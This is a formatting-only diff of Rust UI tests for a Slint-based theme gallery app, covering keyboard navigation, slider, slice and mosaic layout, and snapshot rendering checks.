 fn save_list_keyboard_focus_navs_and_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -2865,7 +3040,9 @@ fn save_list_keyboard_focus_navs_and_renders() {
     // Production-equivalent wiring (same logic main() registers).
     let w = win.as_weak();
     win.on_panel_save_nav(move |delta| {
-        let Some(w) = w.upgrade() else { return; };
+        let Some(w) = w.upgrade() else {
+            return;
+        };
         use slint::Model as _;
         let len = w.get_theme_names().row_count();
         w.set_panel_save_focused_index(crate::callbacks::save_nav_step(
@@ -2877,15 +3054,35 @@ fn save_list_keyboard_focus_navs_and_renders() {
 
     // Arrow walk: -1 (start) → 0 → 1 → 2 → wrap to 0 → back to 2 (1:1 legacy circular)
     win.invoke_panel_save_nav(1);
-    assert_eq!(win.get_panel_save_focused_index(), 0, "first step lands on row 0");
+    assert_eq!(
+        win.get_panel_save_focused_index(),
+        0,
+        "first step lands on row 0"
+    );
     win.invoke_panel_save_nav(1);
-    assert_eq!(win.get_panel_save_focused_index(), 1, "second step reaches Beta");
+    assert_eq!(
+        win.get_panel_save_focused_index(),
+        1,
+        "second step reaches Beta"
+    );
     win.invoke_panel_save_nav(1);
-    assert_eq!(win.get_panel_save_focused_index(), 2, "third step reaches Gamma");
+    assert_eq!(
+        win.get_panel_save_focused_index(),
+        2,
+        "third step reaches Gamma"
+    );
     win.invoke_panel_save_nav(1);
-    assert_eq!(win.get_panel_save_focused_index(), 0, "wraps last -> 0 (1:1 legacy)");
+    assert_eq!(
+        win.get_panel_save_focused_index(),
+        0,
+        "wraps last -> 0 (1:1 legacy)"
+    );
     win.invoke_panel_save_nav(-1);
-    assert_eq!(win.get_panel_save_focused_index(), 2, "backward wraps 0 -> last");
+    assert_eq!(
+        win.get_panel_save_focused_index(),
+        2,
+        "backward wraps 0 -> last"
+    );
 
     // Focused row renders with its keyboard highlight for human review.
     for _ in 0..80 {
@@ -2901,16 +3098,14 @@ fn save_list_keyboard_focus_navs_and_renders() {
 #[test]
 fn panel_menu_and_engaged_slider_render() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -2958,12 +3153,21 @@ fn panel_menu_and_engaged_slider_render() {
     for _ in 0..4 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let engaged = win.window().take_snapshot().expect("slider engaged snapshot");
+    let engaged = win
+        .window()
+        .take_snapshot()
+        .expect("slider engaged snapshot");
     save_slice_png(engaged.clone(), "borders_slider_engaged.png");
     let diff_menu = count_buffer_diff(&menu, &focused);
     let diff_engaged = count_buffer_diff(&focused, &engaged);
-    assert!(diff_menu > 200, "menu ring and slider focus must differ — got {diff_menu}");
-    assert!(diff_engaged > 200, "engaged slider must emphasize over focus — got {diff_engaged}");
+    assert!(
+        diff_menu > 200,
+        "menu ring and slider focus must differ — got {diff_menu}"
+    );
+    assert!(
+        diff_engaged > 200,
+        "engaged slider must emphasize over focus — got {diff_engaged}"
+    );
 }
 
 // ── Save card expansion must animate like PresetCard (Borders/Motion) ──
@@ -2974,16 +3178,14 @@ fn panel_menu_and_engaged_slider_render() {
 #[test]
 fn save_card_expansion_animates_like_preset_cards() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -3008,7 +3210,9 @@ fn save_card_expansion_animates_like_preset_cards() {
     // Production-equivalent save-nav wiring.
     let w = win.as_weak();
     win.on_panel_save_nav(move |delta| {
-        let Some(w) = w.upgrade() else { return; };
+        let Some(w) = w.upgrade() else {
+            return;
+        };
         use slint::Model as _;
         let len = w.get_theme_names().row_count();
         w.set_panel_save_focused_index(crate::callbacks::save_nav_step(
@@ -3077,7 +3281,10 @@ fn save_card_expansion_animates_like_preset_cards() {
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let b_collapsed = win.window().take_snapshot().expect("borders collapsed snapshot");
+    let b_collapsed = win
+        .window()
+        .take_snapshot()
+        .expect("borders collapsed snapshot");
     win.set_panel_kbd_preview_index(1);
     for _ in 0..6 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
@@ -3086,7 +3293,10 @@ fn save_card_expansion_animates_like_preset_cards() {
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let b_end = win.window().take_snapshot().expect("borders settled snapshot");
+    let b_end = win
+        .window()
+        .take_snapshot()
+        .expect("borders settled snapshot");
     let b_full_diff = count_buffer_diff(&b_collapsed, &b_end);
     save_slice_png(b_collapsed.clone(), "borders_focus_card0.png");
     save_slice_png(b_mid.clone(), "borders_focus_mid.png");
@@ -3113,16 +3323,14 @@ fn save_card_expansion_animates_like_preset_cards() {
 #[test]
 fn save_scroll_follows_focus_past_the_fold() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -3136,9 +3344,13 @@ fn save_scroll_follows_focus_past_the_fold() {
         .map(|i| SharedString::from(format!("Theme {i:02}")))
         .collect();
     win.set_theme_names(ModelRc::new(VecModel::from(names.clone())));
-    win.set_theme_saved_ats(ModelRc::new(VecModel::from(
-        vec![SharedString::from("2026-01-01"); 15],
-    )));    win.set_theme_is_actives(ModelRc::new(VecModel::from(vec![false; 15])));
+    win.set_theme_saved_ats(ModelRc::new(VecModel::from(vec![
+        SharedString::from(
+            "2026-01-01"
+        );
+        15
+    ])));
+    win.set_theme_is_actives(ModelRc::new(VecModel::from(vec![false; 15])));
 
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
@@ -3167,20 +3379,28 @@ fn save_scroll_follows_focus_past_the_fold() {
         .map(|i| SharedString::from(format!("Border {i:02}")))
         .collect();
     win.set_border_titles(ModelRc::new(VecModel::from(titles)));
-    win.set_border_descs(ModelRc::new(VecModel::from(
-        vec![SharedString::from(""); 10],
-    )));
-    win.set_border_tags(ModelRc::new(VecModel::from(
-        vec![SharedString::from(""); 10],
-    )));
-    win.set_border_files(ModelRc::new(VecModel::from(
-        vec![SharedString::from("b.lua"); 10],
-    )));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![
+        SharedString::from("");
+        10
+    ])));
+    win.set_border_tags(ModelRc::new(VecModel::from(vec![
+        SharedString::from("");
+        10
+    ])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![
+        SharedString::from(
+            "b.lua"
+        );
+        10
+    ])));
     win.set_panel_kbd_preview_index(8);
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let b_scrolled = win.window().take_snapshot().expect("borders scrolled snapshot");
+    let b_scrolled = win
+        .window()
+        .take_snapshot()
+        .expect("borders scrolled snapshot");
     save_slice_png(b_scrolled, "borders_scroll_follow.png");
 }
 
@@ -3189,16 +3409,14 @@ fn save_scroll_follows_focus_past_the_fold() {
 #[test]
 fn knob_slider_endpoints_render() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -3244,23 +3462,24 @@ fn knob_slider_endpoints_render() {
     save_slice_png(hi.clone(), "knob_max.png");
 
     let diff = count_buffer_diff(&lo, &hi);
-    assert!(diff > 2000, "min and max endpoints must differ — got {diff}");
+    assert!(
+        diff > 2000,
+        "min and max endpoints must differ — got {diff}"
+    );
 }
 
 #[test]
 fn slice_twenty_chained_steps_settle_without_drift() {
     use crate::shell::gallery::views::slice::{focus_step, scaled_metrics, slice_delta_tiles};
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .ok(); // allow already-initialized when tests share the thread
     let win = crate::MainWindow::new().unwrap();
     win.window().set_size(slint::PhysicalSize::new(1920, 1080));
@@ -3335,10 +3554,20 @@ fn slice_twenty_chained_steps_settle_without_drift() {
         win.set_gallery_slice_delta_base(v);
         win.set_gallery_slice_focus_pos(pos);
     }
-    assert!((pos - v as f32).abs() < 0.001, "20 steps must settle frac 0, got {}", pos - v as f32);
+    assert!(
+        (pos - v as f32).abs() < 0.001,
+        "20 steps must settle frac 0, got {}",
+        pos - v as f32
+    );
     let m = scaled_metrics(stage_w);
-    assert!((m.expanded - 924.0).abs() < 0.01, "settled center must be 924");
-    assert!((m.collapsed - 135.0).abs() < 0.01, "settled laterals must be 135");
+    assert!(
+        (m.expanded - 924.0).abs() < 0.01,
+        "settled center must be 924"
+    );
+    assert!(
+        (m.collapsed - 135.0).abs() < 0.01,
+        "settled laterals must be 135"
+    );
     let snap = win.window().take_snapshot().expect("20-step snapshot");
     save_slice_png(snap, "slice_20steps.png");
 }
@@ -3351,9 +3580,20 @@ fn slice_fluid_scaling_renders_small_and_large_no_clipping() {
     // Also unit-assert the 58% rule before taking snapshots.
     let m1092 = scaled_metrics(1092.0);
     let m1920 = scaled_metrics(1920.0);
-    assert!((m1092.expanded - 633.36).abs() < 1.0, "1092 expanded {} expected ~633", m1092.expanded);
-    assert!((m1920.expanded - 924.0).abs() < 0.01, "1920 expanded {}", m1920.expanded);
-    assert!(m1092.expanded < 1092.0 * 0.59, "small expanded must be ≤58%");
+    assert!(
+        (m1092.expanded - 633.36).abs() < 1.0,
+        "1092 expanded {} expected ~633",
+        m1092.expanded
+    );
+    assert!(
+        (m1920.expanded - 924.0).abs() < 0.01,
+        "1920 expanded {}",
+        m1920.expanded
+    );
+    assert!(
+        m1092.expanded < 1092.0 * 0.59,
+        "small expanded must be ≤58%"
+    );
     // Small-screen: 2 per side (total 5) with fixed 32px inset; large 1920 stays 3.
     let small_tiles = slice_delta_tiles(12, 6, 1092.0);
     let mid_tiles = slice_delta_tiles(12, 6, 1280.0);
@@ -3381,7 +3621,10 @@ fn slice_fluid_scaling_renders_small_and_large_no_clipping() {
         "1920 must stay exactly 3 tiles (expanded +1 left +1 right), got {}",
         large_tiles.len()
     );
-    assert!((m1920.collapsed - 135.0).abs() < 0.01, "1920 collapsed must stay 135");
+    assert!(
+        (m1920.collapsed - 135.0).abs() < 0.01,
+        "1920 collapsed must stay 135"
+    );
     assert!((m1920.height - 520.0).abs() < 0.01);
     assert!((m1920.skew - 35.0).abs() < 0.01);
     assert!((m1920.gap - 24.0).abs() < 0.01);
@@ -3391,7 +3634,10 @@ fn slice_fluid_scaling_renders_small_and_large_no_clipping() {
         let min_x = slots.iter().map(|s| s.x).fold(f32::MAX, f32::min);
         let max_r = slots.iter().map(|s| s.x + s.width).fold(f32::MIN, f32::max);
         assert!(min_x >= -0.5, "small stage {w} leftmost {min_x} must be ≥0");
-        assert!(max_r <= w + 0.5, "small stage {w} rightmost {max_r} must be ≤{w}");
+        assert!(
+            max_r <= w + 0.5,
+            "small stage {w} rightmost {max_r} must be ≤{w}"
+        );
     }
     // Render small stage.
     let render_at = |stage_w: f32, stage_h: f32, png: &str| {
@@ -3407,19 +3653,20 @@ fn slice_fluid_scaling_renders_small_and_large_no_clipping() {
         ))
         .ok(); // allow already-initialized when tests run in same thread
         let win = crate::MainWindow::new().unwrap();
-        win.window().set_size(slint::PhysicalSize::new(stage_w as u32, stage_h as u32));
+        win.window()
+            .set_size(slint::PhysicalSize::new(stage_w as u32, stage_h as u32));
         win.set_mounted_screen(1);
         win.set_gallery_empty(false);
         win.set_gallery_style(0);
         win.set_gallery_focused(6);
         let count = 12usize;
         let mut cards: Vec<crate::GalleryCardData> = Vec::new();
-    for i in 0..count {
-        let src = slice_test_gradient(i);
-        cards.push(crate::GalleryCardData {
-            name: SharedString::from(format!("Theme {i}")),
-            saved_at: SharedString::from(""),
-            is_active: false,
+        for i in 0..count {
+            let src = slice_test_gradient(i);
+            cards.push(crate::GalleryCardData {
+                name: SharedString::from(format!("Theme {i}")),
+                saved_at: SharedString::from(""),
+                is_active: false,
                 providers: ModelRc::new(VecModel::from(Vec::<SharedString>::new())),
                 accent: slint::Color::from_rgb_u8(0x8f, 0xd8, 0xff),
                 primary: slint::Color::from_rgb_u8(0x8f, 0xd8, 0xff),
@@ -3434,7 +3681,8 @@ fn slice_fluid_scaling_renders_small_and_large_no_clipping() {
                 thumb: slint::Image::default(),
                 hero: slint::Image::default(),
                 slat_image: {
-                    let rgba = crate::shell::gallery::slat_image::baked_slat_rgba(src.clone(), false);
+                    let rgba =
+                        crate::shell::gallery::slat_image::baked_slat_rgba(src.clone(), false);
                     let (w, h) = (rgba.width(), rgba.height());
                     let mut buf = slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(w, h);
                     buf.make_mut_bytes().copy_from_slice(rgba.as_raw());
@@ -3471,8 +3719,14 @@ fn slice_fluid_scaling_renders_small_and_large_no_clipping() {
         // No overflow: the focused slot (scaled expanded) must be fully inside stage.
         let m = scaled_metrics(stage_w);
         let fx = stage_w / 2.0 - m.expanded / 2.0;
-        assert!(fx >= 0.0 - 0.5, "focused slot left {fx} must be ≥0 at stage {stage_w}");
-        assert!(fx + m.expanded <= stage_w + 0.5, "focused slot right must fit at stage {stage_w}");
+        assert!(
+            fx >= 0.0 - 0.5,
+            "focused slot left {fx} must be ≥0 at stage {stage_w}"
+        );
+        assert!(
+            fx + m.expanded <= stage_w + 0.5,
+            "focused slot right must fit at stage {stage_w}"
+        );
         save_slice_png(snap, png);
     };
     render_at(1092.0, 1080.0, "slice_fluid_1092.png");
@@ -3481,18 +3735,18 @@ fn slice_fluid_scaling_renders_small_and_large_no_clipping() {
 
 #[test]
 fn mosaic_hero_centered_renders_with_pagination() {
-    use crate::shell::gallery::views::mosaic::{justified_hero_layout, mosaic_curtain_delays, MosaicPages};
+    use crate::shell::gallery::views::mosaic::{
+        justified_hero_layout, mosaic_curtain_delays, MosaicPages,
+    };
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -3541,7 +3795,11 @@ fn mosaic_hero_centered_renders_with_pagination() {
     let stage_w = 1920.0f32;
     let stage_h = 1080.0f32;
     let mut pg = MosaicPages::new(count, stage_w, stage_h);
-    assert!(pg.total_pages() >= 2, "12 themes must paginate (capacity {})", pg.capacity());
+    assert!(
+        pg.total_pages() >= 2,
+        "12 themes must paginate (capacity {})",
+        pg.capacity()
+    );
 
     // Paint whatever page `pg` currently stands on, and return each tile's
     // rectangle with the theme it shows. Shared by the three renders below so
@@ -3557,7 +3815,10 @@ fn mosaic_hero_centered_renders_with_pagination() {
             .zip(tile_reals.iter())
             .zip(delays.iter())
             .map(|((t, r), d)| crate::MosaicTileData {
-                x: t.x, y: t.y, w: t.w, h: t.h,
+                x: t.x,
+                y: t.y,
+                w: t.w,
+                h: t.h,
                 real_index: *r as i32,
                 delay_ms: *d as i32,
             })
@@ -3574,7 +3835,10 @@ fn mosaic_hero_centered_renders_with_pagination() {
         win.set_gallery_mosaic_current_page(pg.current() as i32);
         win.set_gallery_mosaic_total_pages(pg.total_pages() as i32);
         win.set_gallery_mosaic_page_numbers(ModelRc::new(VecModel::from(
-            pg.page_numbers().iter().map(|n| *n as i32).collect::<Vec<i32>>(),
+            pg.page_numbers()
+                .iter()
+                .map(|n| *n as i32)
+                .collect::<Vec<i32>>(),
         )));
 
         eprintln!(
@@ -3610,7 +3874,13 @@ fn mosaic_hero_centered_renders_with_pagination() {
 
     // The SAME page 2 with no active theme: R3's shape (its first theme leads).
     assert!(pg.go_to(1), "page 2 exists");
-    let page2_plain = render_page(&win, &pg, stage_w, stage_h, "mosaic_page2_first_of_page.png");
+    let page2_plain = render_page(
+        &win,
+        &pg,
+        stage_w,
+        stage_h,
+        "mosaic_page2_first_of_page.png",
+    );
 
     // R1 + R2 together, the state a theme apply actually produces: the active
     // theme sits on a LATER page, so the Mosaic must open there with it as the
@@ -3637,7 +3907,8 @@ fn mosaic_hero_centered_renders_with_pagination() {
     // delivered D1 defect failed: the hero used to adopt the active theme's
     // shape phase, so the whole composition reflowed on every theme apply.)
     let rects = |p: &[((f32, f32, f32, f32), i32)]| p.iter().map(|(g, _)| *g).collect::<Vec<_>>();
-    let pictures = |p: &[((f32, f32, f32, f32), i32)]| p.iter().map(|(_, r)| *r).collect::<Vec<_>>();
+    let pictures =
+        |p: &[((f32, f32, f32, f32), i32)]| p.iter().map(|(_, r)| *r).collect::<Vec<_>>();
     assert_eq!(
         rects(&page2_plain).len(),
         rects(&page2_active).len(),
@@ -3908,18 +4179,18 @@ fn count_cover_pixels(buf: &slint::SharedPixelBuffer<slint::Rgba8Pixel>) -> usiz
 
 #[test]
 fn mosaic_curtain_phase_driven_renders_mid_and_settled() {
-    use crate::shell::gallery::views::mosaic::{justified_hero_layout, mosaic_curtain_delays, MosaicPages};
+    use crate::shell::gallery::views::mosaic::{
+        justified_hero_layout, mosaic_curtain_delays, MosaicPages,
+    };
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -3961,7 +4232,11 @@ fn mosaic_curtain_phase_driven_renders_mid_and_settled() {
     let stage_w = 1920.0f32;
     let stage_h = 1080.0f32;
     let mut pg = MosaicPages::new(count, stage_w, stage_h);
-    assert!(pg.total_pages() >= 2, "18 themes must paginate (capacity {})", pg.capacity());
+    assert!(
+        pg.total_pages() >= 2,
+        "18 themes must paginate (capacity {})",
+        pg.capacity()
+    );
 
     // Page 0 settled
     let (aspects0, reals0) = pg.page_render();
@@ -3985,7 +4260,10 @@ fn mosaic_curtain_phase_driven_renders_mid_and_settled() {
     win.set_gallery_mosaic_current_page(pg.current() as i32);
     win.set_gallery_mosaic_total_pages(pg.total_pages() as i32);
     win.set_gallery_mosaic_page_numbers(ModelRc::new(VecModel::from(
-        pg.page_numbers().iter().map(|n| *n as i32).collect::<Vec<i32>>(),
+        pg.page_numbers()
+            .iter()
+            .map(|n| *n as i32)
+            .collect::<Vec<i32>>(),
     )));
     // Flush initial layout (no curtain pending — phase 1 settled)
     for _ in 0..2 {
@@ -4019,10 +4297,16 @@ fn mosaic_curtain_phase_driven_renders_mid_and_settled() {
     // Tramo 9: verify under-layer was populated with page 0 tiles
     use slint::Model as _;
     let under = win.get_gallery_mosaic_under_tiles();
-    let under_rc = under.as_any().downcast_ref::<VecModel<crate::MosaicTileData>>()
+    let under_rc = under
+        .as_any()
+        .downcast_ref::<VecModel<crate::MosaicTileData>>()
         .expect("under-tiles should be a VecModel");
-    assert_eq!(under_rc.row_count(), tiles0.len(),
-        "under-tiles must snapshot the outgoing page ({} tiles)", tiles0.len());
+    assert_eq!(
+        under_rc.row_count(),
+        tiles0.len(),
+        "under-tiles must snapshot the outgoing page ({} tiles)",
+        tiles0.len()
+    );
 
     // Mid-curtain: advance ~300ms (~18 ticks) → phase ~0.5, column stagger visible
     for _ in 0..18 {
@@ -4108,18 +4392,18 @@ fn mosaic_curtain_phase_driven_renders_mid_and_settled() {
 
 #[test]
 fn mosaic_curtain_respects_reduced_motion() {
-    use crate::shell::gallery::views::mosaic::{justified_hero_layout, mosaic_curtain_delays, MosaicPages};
+    use crate::shell::gallery::views::mosaic::{
+        justified_hero_layout, mosaic_curtain_delays, MosaicPages,
+    };
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -4181,7 +4465,10 @@ fn mosaic_curtain_respects_reduced_motion() {
     win.set_gallery_mosaic_current_page(pg.current() as i32);
     win.set_gallery_mosaic_total_pages(pg.total_pages() as i32);
     win.set_gallery_mosaic_page_numbers(ModelRc::new(VecModel::from(
-        pg.page_numbers().iter().map(|n| *n as i32).collect::<Vec<i32>>(),
+        pg.page_numbers()
+            .iter()
+            .map(|n| *n as i32)
+            .collect::<Vec<i32>>(),
     )));
     for _ in 0..2 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
@@ -4228,7 +4515,10 @@ fn mosaic_curtain_respects_reduced_motion() {
     let settled = win.window().take_snapshot().expect("reduced settled");
     save_slice_png(settled.clone(), "mosaic_curtain_reduced_settled.png");
     let settled_dark = count_cover_pixels(&settled);
-    assert!(settled_dark < 300, "reduced settled must have no covers — got {settled_dark}");
+    assert!(
+        settled_dark < 300,
+        "reduced settled must have no covers — got {settled_dark}"
+    );
 }
 
 // ── Mutating-window slice 1: panel morph midflight (R1) ──────────────
@@ -4236,16 +4526,14 @@ fn mosaic_curtain_respects_reduced_motion() {
 #[test]
 fn panel_morph_midflight_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -4288,16 +4576,17 @@ fn panel_morph_midflight_renders() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_focus_pos(0.0);
 
@@ -4371,16 +4660,14 @@ fn panel_morph_midflight_renders() {
 #[test]
 fn panel_save_renders() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -4439,16 +4726,17 @@ fn panel_save_renders() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 0, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_focus_pos(0.0);
 
@@ -4467,7 +4755,10 @@ fn panel_save_renders() {
     save_slice_png(err_snap.clone(), "panel_save_error.png");
 
     let diff = count_buffer_diff(&settled, &err_snap);
-    assert!(diff > 200, "error label must change pixels — got {diff} expected >200");
+    assert!(
+        diff > 200,
+        "error label must change pixels — got {diff} expected >200"
+    );
 
     // "My Themes" list must paint: clearing names/dates must change pixels
     win.set_panel_save_error("".into());
@@ -4481,7 +4772,10 @@ fn panel_save_renders() {
     let empty_list_snap = win.window().take_snapshot().expect("panel save empty list");
     save_slice_png(empty_list_snap.clone(), "panel_save_empty_list.png");
     let list_diff = count_buffer_diff(&settled, &empty_list_snap);
-    assert!(list_diff > 200, "My Themes list rows must change pixels — got {list_diff} expected >200");
+    assert!(
+        list_diff > 200,
+        "My Themes list rows must change pixels — got {list_diff} expected >200"
+    );
 
     // Basic sanity: panel save settled must differ from empty gallery snapshot baseline
     assert!(settled.width() == 1920, "snapshot width 1920");
@@ -4497,7 +4791,10 @@ fn panel_save_renders() {
     let es_snap = win.window().take_snapshot().expect("panel save spanish");
